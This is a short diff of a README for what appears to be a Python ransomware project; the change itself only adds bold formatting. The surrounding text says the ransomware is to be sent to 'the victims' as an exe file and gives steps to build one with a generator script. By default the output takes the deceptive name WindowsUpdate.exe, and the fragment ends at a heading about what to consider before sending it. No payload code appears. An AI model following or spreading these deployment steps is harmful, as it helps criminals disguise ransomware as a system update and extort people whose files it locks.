@@ -103,7 +103,7 @@ Believe me when I say this... You can **safely test** this Ransomware on your de
 After we have tested our Ransomware, we intend to send it to the victims in the form of an **exe** file. I have created a python script that will generate an **exe** file of custom name. Follow the steps to generate an exe file:-   
    
 * By default, the exe file generator will be of the name **WindowsUpdate.exe**. But you can edit the name [here]().
-* Run generator.py by typing ```python generator.py```
+* Run **generator.py** by typing ```python generator.py```
 * Wait a few minutes. Your codes are getting compiled into an exe. After the process is over, you will find your exe file in the same directory.
 
 ### Things to consider before sending the exe file
